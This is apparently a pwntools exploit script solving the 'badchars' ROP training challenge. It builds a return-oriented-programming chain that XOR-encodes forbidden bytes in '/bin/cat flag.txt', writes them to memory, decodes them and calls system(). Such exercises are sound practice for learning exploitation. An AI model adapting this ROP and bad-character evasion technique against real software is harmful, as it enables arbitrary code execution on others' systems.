from pwn import *
context(terminal = ["tmux", "new-window"])
context.log_level = "DEBUG"

#p = gdb.debug("./badchars", gdbscript = '''
#init-peda
#b *0x400984
#)
p = process("./badchars")
# first time, i tried to xor all of the chars.....but that would mean that the
# ropchain was way yo big...so we try to xor only the bad chars
mov_r13_r12 = p64(0x400b34) # mov qword ptr [r13], r12 ; ret
pop_r12_r13 = p64(0x400b3b)
pop_rdi = p64(0x400b39)
pop_r14_r15 = p64(0x400b40)
xor_r15_r14b = p64(0x400b30) # xor byte ptr [r15], r14b ; ret
sys = p64(0x4006f0)
junk = "A"*40
xor_pos = [] # we make a list for xored positions
def write_at_addr(mov, pop, str_addr, string):
    while(len(string)%8 != 0): # so know we make sure that the padding is correct
        string += "\x00"
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
    xored_string = ""
    for i in range(len(string)):
        if ord(string[i]) in badchars:
            xored_string = xored_string + chr(ord(string[i])^6)
            xor_pos.append(i)
        else:
            xored_string = xored_string + string[i]
    first_payload = ""
    splitted_string = [xored_string[i:i+8] for i in xrange(0, len(xored_string), 8)]
    for i in range(len(splitted_string)):
        first_payload += pop
        first_payload += splitted_string[i]
        first_payload += p64(u64(str_addr) + (i*8))
        first_payload += mov
    return first_payload
# badchars are: b i c / <space> f n s\n
cat = "/bin/cat flag.txt"
# if we run cat through our helper function, we see that xoring with 6 might do the job
# 25 0x00001070    16 0x00601070    16 -rw- .data
data_seg = p64(0x00601040) # we substracted 0x20 because if we write right
# at the start of .data segment, it gets messed up cause of libc
payload = junk + write_at_addr(mov_r13_r12, pop_r12_r13, data_seg, cat)
for i in xor_pos:
    payload += pop_r14_r15
    payload += p64(6)
    payload += p64(u64(data_seg)+i)
    payload += xor_r15_r14b
payload = payload + pop_rdi + data_seg + sys
p.recvuntil("> ")
p.sendline(payload)
print(p.recv())
p.interactive()
